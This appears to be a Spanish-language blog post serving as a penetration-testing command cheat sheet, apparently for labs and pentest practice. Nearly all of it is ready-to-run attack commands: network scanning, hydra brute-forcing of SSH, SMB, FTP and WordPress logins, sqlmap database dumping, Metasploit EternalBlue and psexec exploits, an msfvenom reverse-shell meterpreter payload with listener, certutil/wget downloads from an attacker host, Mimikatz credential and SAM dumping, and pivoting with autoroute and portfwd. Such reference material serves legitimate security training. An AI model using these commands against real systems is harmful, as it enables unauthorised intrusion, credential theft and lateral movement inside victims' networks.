---
title: Guía de Comandos
date: 2025-12-17 12:10:00 +/-TTTT
categories: [Comandos Pentesting]
tags: [comandos,linux, windows, herramientas, tools, pentesting]     # TAG names should always be lowercase

description: Guía de comandos para Pentesting
---

![img-description](/assets/img/comandos/portada.jpg)
_Image Caption_

## Diccionarios Comunes

### FUZZING

```bash
/usr/share/wordlists/dirb/common.txt
```
### CRACKING

```bash
/usr/share/wordlists/rockyou.txt
```
```bash
/usr/share/metasploit-framework/data/wordlists/unix:passwords.txt
```
## Reconocimiento de Hosts

```bash
nmap -sn X.X.X.X/24
```
```bash
ARP-SCAN --interface=eth0 --localnet
```
## Hostnames Windows

```bash
crackmapexec smb X.X.X.X/24
```
```bash
nmap --script nbstat -p 445 X.X.X.X/24
```
## Añadir Virtual Hosts

```bash
sudo vim /etc/hosts
```
```bash
192.168.100.100 ejemplo.com
```
## Escaneo Avanzado

```bash
nmap -p- --open -n -v --min-rate 5000 -iL hosts.txt -oN puertos.txt
```
```bash
nmap -p- --open -n -v --min-rate 5000 10.10.10.3,4,5 -oN puertos.txt
```
```bash
nmap -sV -sC -p21,22,80 -iL hosts.txt -oN servicios.txt
```
```bash
nmap --script vuln -p21,22,80,445 -oN vulScan.txt
```
## Enumeración Avanzado

```bash
nmap --script=ftp-anon -p21 X.X.X.X
```
```bash
ftp X.X.X.X
```
## Servicios Web

```bash
nikto -host http://X.X.X.X
```
- Fuzzing de Directorios

    ```bash
        dirb http://X.X.X.X/
    ```
- Fuzzing de ARCHIVOS

    ```bash
        dirb http://X.X.X.X/ -X .php,.txt
    ```
### XSS

```bash
<script>alert(xss)</script>
```
```bash
<h1>H1</h1>
```
### SQLMAP

```bash
sqlmap -u "http://X.X.X.X/file.php?id=1" -p id
```
```bash
sqlmap -u "http://X.X.X.X/file.php?id=1" -p id --dbs
```
```bash
sqlmap -u "http://X.X.X.X/file.php?id=1" -p id -D dbname --tables
```
```bash
sqlmap -u "http://X.X.X.X/file.php?id=1" -p id -D dbname -T table_name --dump
```
## Enumeración SMB

### Vulnerabilidades SMB

```bash
nmap --script=smb-vuln* -p445 10.10.14.15 -oN smbScan.txt
```
### Listar Shares

- Anónimo
    ```bash
    crackmapexec smb X.X.X.X/24 -u "-p" --shares
    ```
    ```bash
    smbclient -L 192.168.190.134 -N
    ```
-Con Credenciales
    ```bash
    smbclient -L 192.168.190.134 -U admin
    ```
    ```bash
    smbmap -H 192.168.190.134 -u user -p pass
    ```
### Conexión a un Share

- Anónimo
    ```bash
    smbclient //X.X.X.X/share -N
    ```
-Con Credenciales
    ```bash
    smbclient //X.X.X.X/share -U admin
    ```
### Enumeración Información Sistemas Windows y Samba

```bash
enum4linux -a X.X.X.X
```
```bash
enum4linux -a -u admin -p contraseña X.X.X.X
```
## Fuerza Bruta

### SMB

```bash
hydra -l usuario -P wordlist.txt smb://X.X.X.X
```
### SSH

```bash
hydra -l usuario -P wordlist ssh://X.X.X.X
```
### Wordpress

```bash
wpscan --url http://X.X.X.X/wp-login -U admin --password wordlist.txt
```
### Website

```bash
hydra -l usuario -P wordlist.txt 192.168.190.164 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-sumbit=Log+In:F=The password you entered"
```
### FTP

```bash
hydra -l admin -P wordlist.txt ftp://X.X.X.X
```
## Explotación

### Netcat

```bash
nc -nlvp 443
```
### Metasploit

```bash
msfconsole
```
- EternalBlue
    ```bash
    exploit/windows/smb/ms17_010_eternalblue
    ```
- SMB con Credenciales
    ```bash
    exploit/windows/smb/psexec
    ```
- WebShell to ReverseShell
    ```bash
    exploit/windows/misc/hta_server
    ```
### RDP

```bash
xfreerdp /v:X.X.X.X
```
### Payloads Meterpreter

- Creación
    ```bash
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe -o shell.exe
    ```
- Escucha
    ```bash
    use/exploit/multi/handler
    set LHOST eth0
    set LPORT 4444
    set payload windows/meterpreter/reverse_tcp
    ```
## Post Explotación

### Binarios SUID

```bash
find / -perm -4000 2>dev/null
```
- <https://gtfobins.github.io/>

### Listar Privilegios SUDO

```bash
sudo -l
```
### Compartir Archivos

```bash
python3 -m http.server 80
```
### Descarga de Archivos

- Windows
    ```bash
    certutil.exe -f -split -urlcache http://X.X.X.X/archivo.txt archivo.txt
    ```
- Linux
    ```bash
    wget http://X.X.X.X/archivo.sh
    ```
### Password Cracking

```bash
unshadow passwd shadow > hashes.txt
```
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```
```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
```
- <https://crackstation.net>

### Ver Información de Sistema y Usuarios

- Windows
    ```bash
    systeminfo
    ```
    ```bash
    net user
    ```
- Linux
    ```bash
    uname -a
    ```
    ```bash
    cat /etc/os-release
    ```
    ```bash
    cat /etc/passwd
    ```
### Ver Conexiones de Red Activas

```bash
netstat -ano
```
```bash
netstat -antup
```
### Enumeración Usuarios y Hashes Windows Meterpreter

```bash
load kiwi
```
```bash
creds_all
```
```bash
lsa_dump_sam
```
## Pivoting y Port Forward

### Configuración de Rutas con Autoroute

```bash
use post/multi/manage/autoroute
set SESSION <id_de_sesión>
set SUBNET <subred_interna>/24
run
```
### Identificar Equipos Red Interna

```bash
use post/windows/gather/arp_scanner
set SESSION <ide_de_sesión>
set RHOSTS <IP de la red interna>/24
run
```
### Escaneo de Puertos en la Red Interna

```bash
use auxiliary/scanner/portscan/tcp
set RHOSTS <objetivo>
set PORTS 1-65535
set THREADS 10
run
```
### Acceso a Servicios Internos con Portfd

```bash
meterpreter> portfwd add -l puerto_local -p puerto_remoto -r IP_objetivo
```
- Ejemplo
    ```bash
    meterpreter> portfwd add -l 1234 -p 22 -r 10.10.10.50
    ```
    ```bash
    ssh root@localhost -p 1234
    ```
## Recomendaciónes Adicionales

> Revisar archivos de configuración sitio web, base de datos, credenciales por defecto admin-admin
{: .prompt-tip }

## Páginas Recomendadas

1. <https://www.revshells.com>
2. <https://crackstation.net>
3. <https://gtfobins.github.io/>


